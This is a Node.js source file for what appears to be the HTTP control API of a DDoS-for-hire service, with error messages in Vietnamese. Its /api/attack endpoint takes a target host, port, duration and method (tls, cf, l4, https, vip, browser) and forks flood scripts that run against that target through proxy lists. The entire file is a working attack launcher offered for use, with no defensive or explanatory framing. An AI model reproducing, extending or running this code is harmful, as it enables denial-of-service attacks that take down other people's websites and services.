const http = require('http');
const { fork } = require('child_process');
const url = require('url');
const osu = require('os-utils');
const port = 207;
let lastAPICallTime = Date.now();

const runScript = (scriptName, args) => {
  const childProcess = fork(scriptName, args);

  childProcess.on('error', (err) => {
    console.error(err);
  });

  childProcess.on('message', (message) => {
    console.log(message);
  });
};

const server = http.createServer((req, res) => {
  const currentTime = Date.now();
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const parsedUrl = url.parse(req.url, true);
  const { key, host, port, time, method } = parsedUrl.query;

  if (!host || !port || !time || !method) {
    const err_u = {
      error: true,
      message: 'Sai URL, URL cần phải đủ: /api/attack?host=[url]&port=[port]&method=[methods]&time=[time]',
      code: 410
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_u));
    return;
  }

  if (!port) {
    const err_p = {
      message: 'Thiếu port',
      code: 404
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_p));
    return;
  }

  if (time > 600) {
    const err_time = {
      message: 'Thời gian phải dưới 600s',
      code: 400
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_time));
    return;
  }

  if (!host) {
    const err_host = {
      message: 'Thiếu host',
      code: 404
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_host));
    return;
  }

  if (
    !(
      method.toLowerCase() === 'tls' ||
      method.toLowerCase() === 'cf' ||
      method.toLowerCase() === 'l4' ||
      method.toLowerCase() === 'https' ||
      method.toLowerCase() === 'vip' ||
      method.toLowerCase() === 'browser'
    )
  ) {
    const err_method = {
      err: true,
      method_valid: 'Sai method',
      code: 403
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_method));
    return;
  }

  osu.cpuUsage((v) => {
    const cpuUsage = v * 100;

    const jsonData = {
      status: 'ok',
      cpu_usage: cpuUsage.toFixed(2),
      code: 200
    };

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(jsonData));

    lastAPICallTime = currentTime;

    if (method.toLowerCase() === 'tls') {
      runScript('tls.js', [host, time, '65', '3', 'vip.txt']);
    } else if (method.toLowerCase() === 'cf') {
      runScript('z2.js', [host, time, '65', '1', 'vip.txt']);
    } else if (method.toLowerCase() === 'https') {
      runScript('z2.js', [host, time, '65', '1', 'free.txt']);
    } else if (method.toLowerCase() === 'vip') {
      runScript('z2.js', [host, time, '65', '2', 'vip.txt']);
    } else if (method.toLowerCase() === 'l4') {
      runScript('r2.js', [host, port, '99', time]);
    } else if (method.toLowerCase() === 'browser') {
      runScript('browser.js', [host, '5', 's.txt', '65', time]);
    }
  });
});

server.listen(port, () => {
  console.log(`Server is listening on port ${port}`);
});
